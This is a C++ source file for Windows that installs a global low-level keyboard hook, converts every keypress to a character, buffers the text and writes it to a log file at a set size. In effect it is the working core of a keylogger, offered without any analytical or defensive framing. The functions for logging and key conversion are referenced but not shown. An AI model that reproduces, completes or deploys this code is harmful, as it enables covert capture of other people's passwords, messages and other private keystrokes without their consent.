#include "globals.h"
#include "kbdext.h"
HHOOK hKeyHook;
KBDLLHOOKSTRUCT kbdStruct;
BYTE nkKeyState[256];
WCHAR nkBuffer[16];
std::string nkContentBuffer = "";
WCHAR nkDeadChar;

__declspec(dllexport) LRESULT WINAPI KeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
	if((nCode  == HC_ACTION)     && ((wParam == WM_SYSKEYDOWN) || (wParam  == WM_KEYDOWN)))
	{
		kbdStruct = *((KBDLLHOOKSTRUCT *)lParam);
		char nkKey = (char)kbdStruct.vkCode;
		WCHAR nkCleanKey = '\0';
		int nkConvertCode = 0;
		GetKeyboardState((PBYTE)&nkKeyState);
		nkConvertCode = convertVirtualKeyToWChar(kbdStruct.vkCode, (PWCHAR)&nkCleanKey, (PWCHAR)&nkDeadChar);

#ifdef _DEBUG_
		std::cout << nkCleanKey << std::endl;
#endif 
		nkContentBuffer += nkCleanKey;
   
    if (nkContentBuffer.length() >= MAX_LOG_SIZE)
		{
			writeToLog(nkContentBuffer);
			nkContentBuffer = "";
		}
	}
	return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
}

void MsgLoop()
{
	MSG message;
	while(GetMessage(&message, nullptr, 0, 0))
	{
		TranslateMessage(&message);
		DispatchMessage(&message);
	}
}

DWORD WINAPI keys(LPVOID lpParameter)
{

	HINSTANCE kbdLibrary = loadKeyboardLayout();

	HINSTANCE hExe = GetModuleHandle(NULL);
	if (!hExe) hExe = LoadLibrary((LPCSTR)lpParameter);
	if (!hExe) return 1;

	hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, GetModuleHandle(NULL), 0);

	MsgLoop();

	UnhookWindowsHookEx(hKeyHook);
	return 0;
}
